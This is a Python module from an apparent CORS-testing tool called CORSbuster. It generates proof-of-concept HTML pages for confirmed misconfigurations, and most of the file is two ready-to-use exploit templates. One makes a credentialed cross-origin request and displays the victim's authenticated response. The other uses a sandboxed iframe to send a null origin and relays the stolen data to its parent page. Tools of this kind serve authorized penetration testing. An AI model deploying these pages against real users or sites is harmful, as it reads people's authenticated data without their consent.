"""PoC HTML generator for confirmed CORS vulnerabilities."""

import os
import re
from urllib.parse import urlparse

from . import CheckName, CORSCheckResult, Severity

STANDARD_POC = """<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - {check_name}</title>
    <style>
        body {{ font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }}
        .header {{ color: #ff6b6b; font-size: 20px; font-weight: bold; margin-bottom: 15px; }}
        .info {{ color: #ffd93d; margin: 5px 0; }}
        .label {{ color: #888; }}
        .response {{ background: #16213e; border: 1px solid #0f3460; padding: 15px;
                     margin-top: 15px; white-space: pre-wrap; max-height: 500px;
                     overflow-y: auto; font-size: 13px; }}
        .success {{ color: #6bcb77; font-size: 16px; }}
        .fail {{ color: #ff6b6b; font-size: 16px; }}
        hr {{ border: 1px solid #333; }}
        #status {{ margin: 15px 0; }}
    </style>
</head>
<body>
    <div class="header">CORSbuster - Proof of Concept</div>
    <div class="info"><span class="label">Target:</span> {url}</div>
    <div class="info"><span class="label">Vulnerability:</span> {check_name}</div>
    <div class="info"><span class="label">Severity:</span> {severity}</div>
    <div class="info"><span class="label">Origin Used:</span> {origin}</div>
    <hr>
    <div id="status">Sending cross-origin request with credentials...</div>
    <div id="response" class="response"></div>

    <script>
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {{
            if (xhr.readyState === 4) {{
                if (xhr.status > 0) {{
                    document.getElementById('status').innerHTML =
                        '<span class="success">&#10004; Cross-origin response received! Status: ' +
                        xhr.status + '</span><br><small>The server accepted our origin and returned ' +
                        'authenticated data. This proves the CORS misconfiguration is exploitable.</small>';
                    document.getElementById('response').textContent = xhr.responseText;
                }} else {{
                    document.getElementById('status').innerHTML =
                        '<span class="fail">&#10008; Request blocked by browser CORS policy.</span>';
                }}
            }}
        }};
        xhr.open("GET", "{url}", true);
        xhr.withCredentials = true;
        xhr.send();
    </script>
</body>
</html>"""

NULL_ORIGIN_POC = """<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - Null Origin</title>
    <style>
        body {{ font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }}
        .header {{ color: #ff6b6b; font-size: 20px; font-weight: bold; margin-bottom: 15px; }}
        .info {{ color: #ffd93d; margin: 5px 0; }}
        .label {{ color: #888; }}
        .response {{ background: #16213e; border: 1px solid #0f3460; padding: 15px;
                     margin-top: 15px; white-space: pre-wrap; max-height: 500px;
                     overflow-y: auto; font-size: 13px; }}
        .success {{ color: #6bcb77; font-size: 16px; }}
        #status {{ margin: 15px 0; }}
    </style>
</head>
<body>
    <div class="header">CORSbuster - Proof of Concept (Null Origin)</div>
    <div class="info"><span class="label">Target:</span> {url}</div>
    <div class="info"><span class="label">Vulnerability:</span> Null Origin Accepted</div>
    <div class="info"><span class="label">Severity:</span> {severity}</div>
    <div class="info"><span class="label">Technique:</span> Sandboxed iframe sends Origin: null</div>
    <hr>
    <div id="status">Launching sandboxed iframe exploit...</div>
    <div id="response" class="response"></div>

    <iframe id="poc-frame" style="display:none"
        sandbox="allow-scripts"
        srcdoc='<script>
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {{
                if (xhr.readyState === 4 && xhr.status > 0) {{
                    parent.postMessage(JSON.stringify({{
                        status: xhr.status,
                        data: xhr.responseText
                    }}), "*");
                }}
            }};
            xhr.open("GET", "{url}", true);
            xhr.withCredentials = true;
            xhr.send();
        </script>'>
    </iframe>

    <script>
        window.addEventListener("message", function(e) {{
            try {{
                var result = JSON.parse(e.data);
                document.getElementById("status").innerHTML =
                    '<span class="success">&#10004; Data exfiltrated via null origin! Status: ' +
                    result.status + '</span><br><small>The sandboxed iframe sent Origin: null ' +
                    'and the server returned authenticated data.</small>';
                document.getElementById("response").textContent = result.data;
            }} catch(err) {{
                document.getElementById("response").textContent = e.data;
            }}
        }});
    </script>
</body>
</html>"""


def _escape_html(s: str) -> str:
    """Escape string for safe HTML embedding."""
    return (
        s.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#x27;")
    )


def generate_poc_html(check_result: CORSCheckResult, severity: Severity) -> str:
    """Generate PoC HTML for a confirmed CORS vulnerability."""
    url = _escape_html(check_result.url)
    check_name = _escape_html(check_result.check_name.value)
    origin = _escape_html(check_result.origin_sent)
    sev = severity.value

    if check_result.check_name == CheckName.NULL_ORIGIN:
        return NULL_ORIGIN_POC.format(url=url, severity=sev)

    return STANDARD_POC.format(
        url=url, check_name=check_name, origin=origin, severity=sev,
    )


def save_poc_file(analysis_result, output_dir: str = ".") -> str:
    """Save PoC HTML to file. Returns filepath."""
    if not analysis_result.poc_html:
        return ""

    check = analysis_result.check_result
    parsed = urlparse(check.url)
    # Sanitize filename
    domain = re.sub(r'[^\w.-]', '_', parsed.netloc)
    check_name = re.sub(r'[^\w-]', '_', check.check_name.value.lower().replace(" ", "_"))

    filename = f"poc_{domain}_{check_name}.html"
    filepath = os.path.join(output_dir, filename)

    with open(filepath, "w") as f:
        f.write(analysis_result.poc_html)

    return filepath
